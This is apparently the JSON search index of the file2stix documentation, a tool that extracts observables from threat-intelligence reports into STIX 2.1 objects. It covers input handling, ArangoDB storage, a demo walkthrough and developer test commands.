{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"file2stix Documentation \u00b6 Overview \u00b6 In short; cve2stix processes inputs (files). From inputs, obeserable types are extracted. Observable types are converted to STIX 2.1 Objects. In this documentation you will find each of these steps between input and output explained. For installation, please see the README.md file at the root of file2stix . What's in the docs? \u00b6 Inputs : You can upload a range of filetypes to file2stix. This section of the documentation explains the types of files you can upload and how they are processed before extraction happens. Extractions : file2stix extracts observables from text and translates them into STIX 2.1 Objects. This section of the documentation describes the templates of the STIX Objects created. Backends : Backends allow you to store STIX Objects in a database of your choice in addition to the local filesystem. This section of the documentation shows available backends and how to configure them. Developers / Testing : file2stix was built to be extended. This section of the documentation covers information that will be useful to developers. Building these docs \u00b6 You are probably reading this online (deployed via Github pages .github/workflows/docs.yml . https://signalscorps.github.io/file2stix/ If you want to build the docs locally, from the root directory run; pip3 install -r docs/requirements.txt mkdocs serve --config-file mkdocs.yml","title":"1. Index"},{"location":"#file2stix-documentation","text":"","title":"file2stix Documentation"},{"location":"#overview","text":"In short; cve2stix processes inputs (files). From inputs, obeserable types are extracted. Observable types are converted to STIX 2.1 Objects. In this documentation you will find each of these steps between input and output explained. For installation, please see the README.md file at the root of file2stix .","title":"Overview"},{"location":"#whats-in-the-docs","text":"Inputs : You can upload a range of filetypes to file2stix. This section of the documentation explains the types of files you can upload and how they are processed before extraction happens. Extractions : file2stix extracts observables from text and translates them into STIX 2.1 Objects. This section of the documentation describes the templates of the STIX Objects created. Backends : Backends allow you to store STIX Objects in a database of your choice in addition to the local filesystem. This section of the documentation shows available backends and how to configure them. Developers / Testing : file2stix was built to be extended. This section of the documentation covers information that will be useful to developers.","title":"What's in the docs?"},{"location":"#building-these-docs","text":"You are probably reading this online (deployed via Github pages .github/workflows/docs.yml . https://signalscorps.github.io/file2stix/ If you want to build the docs locally, from the root directory run; pip3 install -r docs/requirements.txt mkdocs serve --config-file mkdocs.yml","title":"Building these docs"},{"location":"backends/","text":"Backends \u00b6 Backends allow you to store STIX Objects in a database of your choice in addition to the local filesystem. This section of the documentation shows available backends and how to configure them. Backend structure \u00b6 Each Backend ships with a default initialization script that is used to create the database schema file2stix will write to. This is executed the first time the backend is used. Backends authentication is specified using a backend <CONFIG>.yml . This configuration file is passed when running file2stix commands. For example, file2stix --input-file tests/file_inputs/txt/input.txt --backend tests/backends/arangodb.yml Local filesystem \u00b6 The default backend is filesystem storage. When file2stix successfully executes and matches are detected two directories will be created; stix2_objects/ <object_type> <object_id> <object.json> STIX Objects for observables detected. These are used for future runs of the script and to write Objects into other backends. In the sub-directories you will find STIX 2.1 Bundles containing individual STIX 2.1 Objects extracted. stix2_bundles/ Final STIX bundles containing collections of Objects from observables extracted from reports. In the sub-directories you will find STIX 2.1 Bundles containing all STIX 2.1 Objects extracted from a report. Some examples can be seen in the /tests/expected_reports directory. This backend is always used as the json files saved are used to populate other backends. ArangoDB ( arangodb ) \u00b6 This backend is built to support the ArangoDB community version. To do this user should supply a backend config file with the following structure; backend: arangodb # specifies config is for arangodb backend. must be specified exactly as shown here host: # optional, default if blank: 'http://127.0.0.1:8529' username: # optional, default if blank: root password: # optional, default if blank: '' database_name: # optional, default if blank: 'file2stix' document_collection_name: # optional, default if blank: 'stix_objects' edge_collection_name: # optional, default if blank: 'stix_relationships' The username supplied must have permissions in ArangoDB to create new Databases and Collections, and write to these Collections. An example can be seen in /tests/backends/arangodb.yml . By passing the --backend flag, the backend will be invoked. For example; file2stix --input-file tests/file_inputs/txt/input.txt --backend tests/backends/arangodb.yml The initialisation script /backends/arangodb/arangodb.py checks for the following in the ArangoDB instance; 1x Database (name defined in backend config file, default is file2stix ) 1x Document Collection in the Database (name defined in backend config file, default is stix_objects ) 1x Edge Collection in the Database (name defined in backend config file, default is stix_relationships ) If these exist, then they script will start writing data. If they do not exist, the script will create them and then start writing data. file2stix stores newly created json files (representing STIX 2.1 Objects) created on each script run (in stix2_objects/ ) in each ArangoDB Collection. file2stix only ever creates one version of an Object (with unique id ), therefore only one version of an Object will ever exist in the Document and Edge ArangoDB Collections. Here is how the STIX 2.1 Objects are stored in ArangoDB; STIX 2.1 Objects (except for Relationship SROs) \u00b6 All STIX 2.1 Objects types (except for Relationship SROs) are stored in the Document Collection like so; { \"_key\": \"<STIX OBJECT ID>\", \"<FULL STIX OBJECT PAYLOAD>\" } Note, <FULL STIX OBJECT PAYLOAD> refers to the json key/values of the STIX Object. e.g. { \"_key\": \"indicator--0eaa7158-bd7d-492f-b7c3-cb47f4ed85ab\", \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--0eaa7158-bd7d-492f-b7c3-cb47f4ed85ab\", \"created\": \"2022-09-07T06:11:36.285448Z\", \"modified\": \"2022-09-07T09:27:21.741076Z\", \"name\": \"ipv4: 198.0.103.12:8000\", \"indicator_types\": [ \"unknown\" ], \"pattern\": \"[ ipv4-addr:value = '198.0.103.12' AND network-traffic:dst_port = '8000' ]\", \"pattern_type\": \"stix\", \"pattern_version\": \"2.1\", \"valid_from\": \"2022-09-07T06:11:36.285448Z\", \"object_marking_refs\": [ \"marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9\" ] } Relationship STIX 2.1 Objects \u00b6 All STIX 2.1 Objects with type relationship are stored in the Edge Collection like so; { \"_key\": \"<STIX RELATIONSHIP OBJECT ID>\", \"_from\": \"stix_objects/<STIX RELATIONSHIP OBJECT SOURCE_REF>\", \"_to\": \"stix_objects/<STIX RELATIONSHIP OBJECT TARGET_REF>\", \"<FULL STIX RELATIONSHIP OBJECT PAYLOAD>\" } Note, <FULL STIX RELATIONSHIP OBJECT PAYLOAD> refers to the json key/values of the STIX Object. e.g. { \"_key\": \"relationship--4bc6e063-2547-4f5d-8f30-fd6cca4037f7\", \"_from\": \"stix_objects/indicator--945df870-12cd-4e28-a90a-46fb6918278c\", \"_to\": \"stix_objects/report--b5d4d317-510f-4413-8d88-388e46cfa18b\", \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--4bc6e063-2547-4f5d-8f30-fd6cca4037f7\", \"created\": \"2022-09-07T09:28:24.077169Z\", \"modified\": \"2022-09-07T09:28:24.077169Z\", \"relationship_type\": \"default-extract-from\", \"source_ref\": \"indicator--945df870-12cd-4e28-a90a-46fb6918278c\", \"target_ref\": \"report--b5d4d317-510f-4413-8d88-388e46cfa18b\", \"object_marking_refs\": [ \"marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9\" ] } Embedded relationship ( *_ref and *_refs ) properties \u00b6 All *_ref and *_refs properties are converted to custom relationship objects (not STIX Objects) and stored in the Edge Collection as follows; { \"_key\": \"<OBJECT WITH REF PROPERTY>+<OBJECT BEING REFERENCED>\", \"_from\": \"stix_objects/<OBJECT WITH REF PROPERTY>\", \"_to\": \"stix_objects/<OBJECT BEING REFERENCED>\", \"type\": \"embedded-relationship\", \"relationship_description\": \"<PROPERTY NAME>\", \"deprecated\": false } For example; { \"_key\": \"report--b5d4d317-510f-4413-8d88-388e46cfa18b+indicator--945df870-12cd-4e28-a90a-46fb6918278c\", \"_from\": \"stix_objects/report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"_to\": \"stix_objects/indicator--26ffb872-1dd9-446e-b6f5-d58527e5b5d2\", \"type\": \"embedded-relationship\", \"relationship_description\": \"object_refs\", \"deprecated\": false } Note, the deprecated property in file2stix will always equal false because no embedded relationship properties are ever removed in an UPDATE. Dealing with updates to extracted Objects (SDOs) \u00b6 In the case of Reports marked TLP WHITE, updates can happen to extracted objects when they are seen for a second time. The only update that will happen to these Objects will be that their modified time property will increase. This makes dealing with updates fairly trivial. First, a new Object is created, identical to the original (created on previous run), however, with a different _key in the format id + modified properties, for example; INSERT { \"_key\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3+2015-12-21T19:59:11.000Z\", \"type\": \"report\", \"id\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"created\": \"2015-12-21T19:59:11.000Z\", \"modified\": \"2015-12-21T19:59:11.000Z\", \"name\": \"The Black Vine Cyberespionage Group\", \"description\": \"A simple report with an indicator and campaign\", \"published\": \"2015-12-21T19:59:11.000Z\", \"report_types\": [\"campaign\"], \"object_refs\": [ \"indicator--26ffb872-1dd9-446e-b6f5-d58527e5b5d2\", \"campaign--83422c77-904c-4dc1-aff5-5c38f3a2c55c\", \"relationship--f82356ae-fe6c-437c-9c24-6b64314ae68a\" ] } IN stix_objects Then, the original ArangoDB object for this entry (in this case _key: report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3 ) is UPDATEd to reflect the changes; UPDATE { \"_key\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"type\": \"report\", \"id\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"created\": \"2015-12-21T19:59:11.000Z\", \"modified\": \"2021-01-01T00:00:00.000Z\", \"name\": \"A new name\", \"description\": \"A new report\", \"published\": \"2015-12-21T19:59:11.000Z\", \"report_types\": [\"campaign\"], \"object_refs\": [ \"indicator--26ffb872-1dd9-446e-b6f5-d58527e5b5d2\", \"campaign--83422c77-904c-4dc1-aff5-5c38f3a2c55c\", \"relationship--f82356ae-fe6c-437c-9c24-6b64314ae68a\" ] } IN stix_objects As no other updates happen in file2stix (e.g. changes to old relationships) no other action is needed when such an update happens. Dealing with updates to extracted Objects (SCOs) \u00b6 Due to the way SCOs are handled (optional properties are not considered) then SCOs always retain the same id assuming the value field is the same. https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_q6l05xzpcdf This means SCOs are overwritten, and not versioned in arangodb the same way. There will be multiple revisions of the object (with different values for _rev for each overwrite). The revision ( _rev ) attribute is just there as a marker so you can know when a field was updated. You can't change it directly, but every time you UPDATE a document in a collection, the _rev value is updated. You will need to use this to see version history of SCOs.","title":"4. Backends"},{"location":"backends/#backends","text":"Backends allow you to store STIX Objects in a database of your choice in addition to the local filesystem. This section of the documentation shows available backends and how to configure them.","title":"Backends"},{"location":"backends/#backend-structure","text":"Each Backend ships with a default initialization script that is used to create the database schema file2stix will write to. This is executed the first time the backend is used. Backends authentication is specified using a backend <CONFIG>.yml . This configuration file is passed when running file2stix commands. For example, file2stix --input-file tests/file_inputs/txt/input.txt --backend tests/backends/arangodb.yml","title":"Backend structure"},{"location":"backends/#local-filesystem","text":"The default backend is filesystem storage. When file2stix successfully executes and matches are detected two directories will be created; stix2_objects/ <object_type> <object_id> <object.json> STIX Objects for observables detected. These are used for future runs of the script and to write Objects into other backends. In the sub-directories you will find STIX 2.1 Bundles containing individual STIX 2.1 Objects extracted. stix2_bundles/ Final STIX bundles containing collections of Objects from observables extracted from reports. In the sub-directories you will find STIX 2.1 Bundles containing all STIX 2.1 Objects extracted from a report. Some examples can be seen in the /tests/expected_reports directory. This backend is always used as the json files saved are used to populate other backends.","title":"Local filesystem"},{"location":"backends/#arangodb-arangodb","text":"This backend is built to support the ArangoDB community version. To do this user should supply a backend config file with the following structure; backend: arangodb # specifies config is for arangodb backend. must be specified exactly as shown here host: # optional, default if blank: 'http://127.0.0.1:8529' username: # optional, default if blank: root password: # optional, default if blank: '' database_name: # optional, default if blank: 'file2stix' document_collection_name: # optional, default if blank: 'stix_objects' edge_collection_name: # optional, default if blank: 'stix_relationships' The username supplied must have permissions in ArangoDB to create new Databases and Collections, and write to these Collections. An example can be seen in /tests/backends/arangodb.yml . By passing the --backend flag, the backend will be invoked. For example; file2stix --input-file tests/file_inputs/txt/input.txt --backend tests/backends/arangodb.yml The initialisation script /backends/arangodb/arangodb.py checks for the following in the ArangoDB instance; 1x Database (name defined in backend config file, default is file2stix ) 1x Document Collection in the Database (name defined in backend config file, default is stix_objects ) 1x Edge Collection in the Database (name defined in backend config file, default is stix_relationships ) If these exist, then they script will start writing data. If they do not exist, the script will create them and then start writing data. file2stix stores newly created json files (representing STIX 2.1 Objects) created on each script run (in stix2_objects/ ) in each ArangoDB Collection. file2stix only ever creates one version of an Object (with unique id ), therefore only one version of an Object will ever exist in the Document and Edge ArangoDB Collections. Here is how the STIX 2.1 Objects are stored in ArangoDB;","title":"ArangoDB (arangodb)"},{"location":"backends/#stix-21-objects-except-for-relationship-sros","text":"All STIX 2.1 Objects types (except for Relationship SROs) are stored in the Document Collection like so; { \"_key\": \"<STIX OBJECT ID>\", \"<FULL STIX OBJECT PAYLOAD>\" } Note, <FULL STIX OBJECT PAYLOAD> refers to the json key/values of the STIX Object. e.g. { \"_key\": \"indicator--0eaa7158-bd7d-492f-b7c3-cb47f4ed85ab\", \"type\": \"indicator\", \"spec_version\": \"2.1\", \"id\": \"indicator--0eaa7158-bd7d-492f-b7c3-cb47f4ed85ab\", \"created\": \"2022-09-07T06:11:36.285448Z\", \"modified\": \"2022-09-07T09:27:21.741076Z\", \"name\": \"ipv4: 198.0.103.12:8000\", \"indicator_types\": [ \"unknown\" ], \"pattern\": \"[ ipv4-addr:value = '198.0.103.12' AND network-traffic:dst_port = '8000' ]\", \"pattern_type\": \"stix\", \"pattern_version\": \"2.1\", \"valid_from\": \"2022-09-07T06:11:36.285448Z\", \"object_marking_refs\": [ \"marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9\" ] }","title":"STIX 2.1 Objects (except for Relationship SROs)"},{"location":"backends/#relationship-stix-21-objects","text":"All STIX 2.1 Objects with type relationship are stored in the Edge Collection like so; { \"_key\": \"<STIX RELATIONSHIP OBJECT ID>\", \"_from\": \"stix_objects/<STIX RELATIONSHIP OBJECT SOURCE_REF>\", \"_to\": \"stix_objects/<STIX RELATIONSHIP OBJECT TARGET_REF>\", \"<FULL STIX RELATIONSHIP OBJECT PAYLOAD>\" } Note, <FULL STIX RELATIONSHIP OBJECT PAYLOAD> refers to the json key/values of the STIX Object. e.g. { \"_key\": \"relationship--4bc6e063-2547-4f5d-8f30-fd6cca4037f7\", \"_from\": \"stix_objects/indicator--945df870-12cd-4e28-a90a-46fb6918278c\", \"_to\": \"stix_objects/report--b5d4d317-510f-4413-8d88-388e46cfa18b\", \"type\": \"relationship\", \"spec_version\": \"2.1\", \"id\": \"relationship--4bc6e063-2547-4f5d-8f30-fd6cca4037f7\", \"created\": \"2022-09-07T09:28:24.077169Z\", \"modified\": \"2022-09-07T09:28:24.077169Z\", \"relationship_type\": \"default-extract-from\", \"source_ref\": \"indicator--945df870-12cd-4e28-a90a-46fb6918278c\", \"target_ref\": \"report--b5d4d317-510f-4413-8d88-388e46cfa18b\", \"object_marking_refs\": [ \"marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9\" ] }","title":"Relationship STIX 2.1 Objects"},{"location":"backends/#embedded-relationship-_ref-and-_refs-properties","text":"All *_ref and *_refs properties are converted to custom relationship objects (not STIX Objects) and stored in the Edge Collection as follows; { \"_key\": \"<OBJECT WITH REF PROPERTY>+<OBJECT BEING REFERENCED>\", \"_from\": \"stix_objects/<OBJECT WITH REF PROPERTY>\", \"_to\": \"stix_objects/<OBJECT BEING REFERENCED>\", \"type\": \"embedded-relationship\", \"relationship_description\": \"<PROPERTY NAME>\", \"deprecated\": false } For example; { \"_key\": \"report--b5d4d317-510f-4413-8d88-388e46cfa18b+indicator--945df870-12cd-4e28-a90a-46fb6918278c\", \"_from\": \"stix_objects/report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"_to\": \"stix_objects/indicator--26ffb872-1dd9-446e-b6f5-d58527e5b5d2\", \"type\": \"embedded-relationship\", \"relationship_description\": \"object_refs\", \"deprecated\": false } Note, the deprecated property in file2stix will always equal false because no embedded relationship properties are ever removed in an UPDATE.","title":"Embedded relationship (*_ref and *_refs) properties"},{"location":"backends/#dealing-with-updates-to-extracted-objects-sdos","text":"In the case of Reports marked TLP WHITE, updates can happen to extracted objects when they are seen for a second time. The only update that will happen to these Objects will be that their modified time property will increase. This makes dealing with updates fairly trivial. First, a new Object is created, identical to the original (created on previous run), however, with a different _key in the format id + modified properties, for example; INSERT { \"_key\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3+2015-12-21T19:59:11.000Z\", \"type\": \"report\", \"id\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"created\": \"2015-12-21T19:59:11.000Z\", \"modified\": \"2015-12-21T19:59:11.000Z\", \"name\": \"The Black Vine Cyberespionage Group\", \"description\": \"A simple report with an indicator and campaign\", \"published\": \"2015-12-21T19:59:11.000Z\", \"report_types\": [\"campaign\"], \"object_refs\": [ \"indicator--26ffb872-1dd9-446e-b6f5-d58527e5b5d2\", \"campaign--83422c77-904c-4dc1-aff5-5c38f3a2c55c\", \"relationship--f82356ae-fe6c-437c-9c24-6b64314ae68a\" ] } IN stix_objects Then, the original ArangoDB object for this entry (in this case _key: report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3 ) is UPDATEd to reflect the changes; UPDATE { \"_key\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"type\": \"report\", \"id\": \"report--84e4d88f-44ea-4bcd-bbf3-b2c1c320bcb3\", \"created\": \"2015-12-21T19:59:11.000Z\", \"modified\": \"2021-01-01T00:00:00.000Z\", \"name\": \"A new name\", \"description\": \"A new report\", \"published\": \"2015-12-21T19:59:11.000Z\", \"report_types\": [\"campaign\"], \"object_refs\": [ \"indicator--26ffb872-1dd9-446e-b6f5-d58527e5b5d2\", \"campaign--83422c77-904c-4dc1-aff5-5c38f3a2c55c\", \"relationship--f82356ae-fe6c-437c-9c24-6b64314ae68a\" ] } IN stix_objects As no other updates happen in file2stix (e.g. changes to old relationships) no other action is needed when such an update happens.","title":"Dealing with updates to extracted Objects (SDOs)"},{"location":"backends/#dealing-with-updates-to-extracted-objects-scos","text":"Due to the way SCOs are handled (optional properties are not considered) then SCOs always retain the same id assuming the value field is the same. https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_q6l05xzpcdf This means SCOs are overwritten, and not versioned in arangodb the same way. There will be multiple revisions of the object (with different values for _rev for each overwrite). The revision ( _rev ) attribute is just there as a marker so you can know when a field was updated. You can't change it directly, but every time you UPDATE a document in a collection, the _rev value is updated. You will need to use this to see version history of SCOs.","title":"Dealing with updates to extracted Objects (SCOs)"},{"location":"demo/","text":"Demo Script \u00b6 file2stix is designed to take unstructured intel documents -- text, emails, pdfs, word docs -- and turn them into structured STIX 2.1 intel. Let's ease into it gently. Extractions 101 \u00b6 A simple extraction of an IP. Here's the file I will input to file2stix, and now I will run the script; file2stix --input-file tests/observable_tests/ipv4.txt As you can see a Report SDO, Indicator SDO, and IPv4 SCO have been created. file2stix support most STIX 2.1 SDO, SRO, and SCO objects, and also introduces some custom objects (using extensions definitions). Defang extractions \u00b6 In many cases reports contain fanged data. file2stix won't automatically extract these, but can be instructed to try and defang them before extractions. file2stix --input-file tests/observable_tests/ipv4-fanged.txt --defang-observables Note, file2stix attempts to extract many types of fangs, but not all due to the variety used. Note, if I pass the same file without defang, no data will be extracted; file2stix --input-file tests/observable_tests/ipv4-fanged.txt Extraction modes \u00b6 One thing I observed was people using browser extensions to extract data from logs in SIEMs -- not naming any names but there have been many similar scenarios. To satisfy various uses like this; file2stix offers 3 extraction modes; analysis (shown), observed which in addition to analysis mode will use the observed data object to also count the times an observable has been seen in a report, and sighting which in addition to observed mode will report a Sighting SRO against the Observed data object, e.g. file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode sighting Supported filetypes \u00b6 file2stix supports multi-filetypes for extraction (doc, pdf, csv, ) file2stix --input-file tests/demos/ipv4.docx Depending on the filetype file2stix will treat it differently. In the case of doc files they are firstly translated to txt. file2stix also supports html, in this case, file2stix strips the html tags. In both of these previous examples, you will see the same object extracted. Custom extractions \u00b6 All these objects are created from extractions defined using regular expressions (essentially pattern matching). Over 20 default extractions are supported by file2stix from AS numbers, cryptocurrency wallets, credit-cards, to detection rules like Sigma etc. The nice thing about using regex is that it makes the tool expandable to tweak existing and add new extractions. If you don't want to get into the codebase file2stix also allows for custom extractions. You can enter your own string of text and map it to a STIX object and file2stix will use it as part of the extraction logic. file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction.txt Warning list / ignoring extractions \u00b6 If you're working with large files you can choose to ignore certain types observables from extraction entirely; file2stix --input-file tests/observable_tests/ipv4.txt --ignore-observable-prefix IPv4 file2stix also supports MISP Warning Lists. For those unfamiliar MISP Warning List identify false positives, e.g. google.com extracted from a report. By default MISP Warning Lists will be considered against all extractions; file2stix --input-file tests/warning_lists/default_list_matches-string.txt You can see in the output how the Indicator SDO contains an extension linking the MISP Warning List Match. It's also possible to create your own Warning Lists (in MISP Warning List format) to identify benign extractions; file2stix --input-file tests/observable_tests/ipv4.txt --misp-custom-warning-list-file tests/warning_lists/ipv4.json MITRE Knowledge-bases \u00b6 file2stix also takes in external MITRE knowledge-bases -- ATT&CK and CAPEC -- for extraction. file2stix --input-file tests/observable_tests/mitre_attck_enterprise.txt --update-mitre-cti-database You'll see I am passing --update-mitre-cti-database , this just makes file2stix is using the most up-to-date version of ATT&CK and CAPEC. In this example, file2stix has detected references two ATT&CK techniques. All ATT&CK and CAPEC STIX objects are supported. This makes it really useful when adding the contextual information to reports -- I know a lot of analysts doing this manually right now. TLP Levels \u00b6 By default, file2stix assigns TLP White to objects extracted, but you can modify this by specifying TLP levels: file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level RED Here all extracted SDOs and SROs are tagged as TLP RED. Confidence \u00b6 If you trust the author of the report (or are unsure), it's possible to assign a confidence score to extracted SDOs (including the Report SDO). Currently this is quite simplistic and will apply the same confidence score to all SDOs, for example; file2stix --input-file tests/observable_tests/ipv4.txt --confidence 80 Identities \u00b6 By default, file2stix will use the default file2stix identity and assign that to the created_by_ref of SDOs and SROs. Many of you will want to change this to an existing STIX Identity (or new one) for your organisation. This can be done by passing your own identity.yml file as documented. This will create a new STIX identity object using the defined settings that will be used instead; ```shell file2stix --input-file tests/observable_tests/ipv4.txt --user-identity-file tests/stix_templates/custom_identity_good.yml ```` End \u00b6 That was very quick demo of file2stix. You can use a combination of these options to get the desired output. There's a lot more to file2stix I haven't covered. Be sure to check out the full documentation.","title":"6. Demo Walkthrough"},{"location":"demo/#demo-script","text":"file2stix is designed to take unstructured intel documents -- text, emails, pdfs, word docs -- and turn them into structured STIX 2.1 intel. Let's ease into it gently.","title":"Demo Script"},{"location":"demo/#extractions-101","text":"A simple extraction of an IP. Here's the file I will input to file2stix, and now I will run the script; file2stix --input-file tests/observable_tests/ipv4.txt As you can see a Report SDO, Indicator SDO, and IPv4 SCO have been created. file2stix support most STIX 2.1 SDO, SRO, and SCO objects, and also introduces some custom objects (using extensions definitions).","title":"Extractions 101"},{"location":"demo/#defang-extractions","text":"In many cases reports contain fanged data. file2stix won't automatically extract these, but can be instructed to try and defang them before extractions. file2stix --input-file tests/observable_tests/ipv4-fanged.txt --defang-observables Note, file2stix attempts to extract many types of fangs, but not all due to the variety used. Note, if I pass the same file without defang, no data will be extracted; file2stix --input-file tests/observable_tests/ipv4-fanged.txt","title":"Defang extractions"},{"location":"demo/#extraction-modes","text":"One thing I observed was people using browser extensions to extract data from logs in SIEMs -- not naming any names but there have been many similar scenarios. To satisfy various uses like this; file2stix offers 3 extraction modes; analysis (shown), observed which in addition to analysis mode will use the observed data object to also count the times an observable has been seen in a report, and sighting which in addition to observed mode will report a Sighting SRO against the Observed data object, e.g. file2stix --input-file tests/observable_tests/ipv4.txt --extraction-mode sighting","title":"Extraction modes"},{"location":"demo/#supported-filetypes","text":"file2stix supports multi-filetypes for extraction (doc, pdf, csv, ) file2stix --input-file tests/demos/ipv4.docx Depending on the filetype file2stix will treat it differently. In the case of doc files they are firstly translated to txt. file2stix also supports html, in this case, file2stix strips the html tags. In both of these previous examples, you will see the same object extracted.","title":"Supported filetypes"},{"location":"demo/#custom-extractions","text":"All these objects are created from extractions defined using regular expressions (essentially pattern matching). Over 20 default extractions are supported by file2stix from AS numbers, cryptocurrency wallets, credit-cards, to detection rules like Sigma etc. The nice thing about using regex is that it makes the tool expandable to tweak existing and add new extractions. If you don't want to get into the codebase file2stix also allows for custom extractions. You can enter your own string of text and map it to a STIX object and file2stix will use it as part of the extraction logic. file2stix --input-file tests/custom_extractions/malware_input_file.txt --custom-extraction-file tests/custom_extractions/malware_custom_extraction.txt","title":"Custom extractions"},{"location":"demo/#warning-list-ignoring-extractions","text":"If you're working with large files you can choose to ignore certain types observables from extraction entirely; file2stix --input-file tests/observable_tests/ipv4.txt --ignore-observable-prefix IPv4 file2stix also supports MISP Warning Lists. For those unfamiliar MISP Warning List identify false positives, e.g. google.com extracted from a report. By default MISP Warning Lists will be considered against all extractions; file2stix --input-file tests/warning_lists/default_list_matches-string.txt You can see in the output how the Indicator SDO contains an extension linking the MISP Warning List Match. It's also possible to create your own Warning Lists (in MISP Warning List format) to identify benign extractions; file2stix --input-file tests/observable_tests/ipv4.txt --misp-custom-warning-list-file tests/warning_lists/ipv4.json","title":"Warning list / ignoring extractions"},{"location":"demo/#mitre-knowledge-bases","text":"file2stix also takes in external MITRE knowledge-bases -- ATT&CK and CAPEC -- for extraction. file2stix --input-file tests/observable_tests/mitre_attck_enterprise.txt --update-mitre-cti-database You'll see I am passing --update-mitre-cti-database , this just makes file2stix is using the most up-to-date version of ATT&CK and CAPEC. In this example, file2stix has detected references two ATT&CK techniques. All ATT&CK and CAPEC STIX objects are supported. This makes it really useful when adding the contextual information to reports -- I know a lot of analysts doing this manually right now.","title":"MITRE Knowledge-bases"},{"location":"demo/#tlp-levels","text":"By default, file2stix assigns TLP White to objects extracted, but you can modify this by specifying TLP levels: file2stix --input-file tests/observable_tests/ipv4.txt --tlp-level RED Here all extracted SDOs and SROs are tagged as TLP RED.","title":"TLP Levels"},{"location":"demo/#confidence","text":"If you trust the author of the report (or are unsure), it's possible to assign a confidence score to extracted SDOs (including the Report SDO). Currently this is quite simplistic and will apply the same confidence score to all SDOs, for example; file2stix --input-file tests/observable_tests/ipv4.txt --confidence 80","title":"Confidence"},{"location":"demo/#identities","text":"By default, file2stix will use the default file2stix identity and assign that to the created_by_ref of SDOs and SROs. Many of you will want to change this to an existing STIX Identity (or new one) for your organisation. This can be done by passing your own identity.yml file as documented. This will create a new STIX identity object using the defined settings that will be used instead; ```shell file2stix --input-file tests/observable_tests/ipv4.txt --user-identity-file tests/stix_templates/custom_identity_good.yml ````","title":"Identities"},{"location":"demo/#end","text":"That was very quick demo of file2stix. You can use a combination of these options to get the desired output. There's a lot more to file2stix I haven't covered. Be sure to check out the full documentation.","title":"End"},{"location":"developers/","text":"Developers \u00b6 file2stix was built to be extended. This section of the documentation covers information that will be useful to developers. Useful public intel sources for testing \u00b6 ORKL Threat Intelligence Library APT & CyberCriminal Campaign Collection Running tests \u00b6 Ensure that pytest is installed: pip install pytest Then run pytest command in the command line to run all tests: pytest Testing obeservable types \u00b6 Supported observables \u00b6 ASN \u00b6 file2stix --input-file tests/observable_tests/asn.txt Country \u00b6 file2stix --input-file tests/observable_tests/country_adjective.txt file2stix --input-file tests/observable_tests/country_code.txt CVE \u00b6 file2stix --input-file tests/observable_tests/cve.txt CPE \u00b6 file2stix --input-file tests/observable_tests/cpe.txt Cyptocurrency \u00b6 BTC \u00b6 file2stix --input-file tests/observable_tests/crypto_btc.txt ETH \u00b6 file2stix --input-file tests/observable_tests/crypto_eth.txt XMR \u00b6 file2stix --input-file tests/observable_tests/crypto_xmr.txt Credit Card \u00b6 Amex \u00b6 file2stix --input-file tests/observable_tests/credit_card_amex.txt Mastercard \u00b6 file2stix --input-file tests/observable_tests/credit_card_mastercard.txt Visa \u00b6 file2stix --input-file tests/observable_tests/credit_card_visa.txt Discover \u00b6 file2stix --input-file tests/observable_tests/credit_card_discover.txt Diners \u00b6 file2stix --input-file tests/observable_tests/diners.txt Union Pay \u00b6 file2stix --input-file tests/observable_tests/credit_card_union_pay.txt JCB \u00b6 file2stix --input-file tests/observable_tests/credit_card_jcb.txt Directory \u00b6 file2stix --input-file tests/observable_tests/directory.txt Domain / sub-domain \u00b6 Domain \u00b6 file2stix --input-file tests/observable_tests/domain.txt Subdomain \u00b6 file2stix --input-file tests/observable_tests/domain_sub.txt Email \u00b6 file2stix --input-file tests/observable_tests/email.txt Filehash \u00b6 md5 \u00b6 file2stix --input-file tests/observable_tests/file_hash_md5.txt sha1 \u00b6 file2stix --input-file tests/observable_tests/file_hash_sha1.txt sha256 \u00b6 file2stix --input-file tests/observable_tests/file_hash_sha256.txt sha512 \u00b6 file2stix --input-file tests/observable_tests/file_hash_sha512.txt ssdeep \u00b6 file2stix --input-file tests/observable_tests/file_hash_ssdeep.txt File \u00b6 file2stix --input-file tests/observable_tests/file.txt Bank Account \u00b6 file2stix --input-file tests/observable_tests/iban.txt IPv4 \u00b6 IPv4 \u00b6 file2stix --input-file tests/observable_tests/ipv4.txt file2stix --input-file tests/observable_tests/ipv4-multi.txt IPv4 with port \u00b6 file2stix --input-file tests/observable_tests/ipv4_port.txt IPv4 with CIDR \u00b6 file2stix --input-file tests/observable_tests/ipv4_cidr.txt IPv6 \u00b6 IPv6 \u00b6 file2stix --input-file tests/observable_tests/ipv6.txt IPv6 with port \u00b6 file2stix --input-file tests/observable_tests/ipv6_port.txt IPv6 with CIDR \u00b6 file2stix --input-file tests/observable_tests/ipv6_cidr.txt MITRE ATT&CK \u00b6 Shared Matrices \u00b6 file2stix --input-file tests/observable_tests/mitre_attck_all.txt --update-mitre-cti-database Enterprise Matrix (newest) \u00b6 file2stix --input-file tests/observable_tests/mitre_attck_enterprise.txt 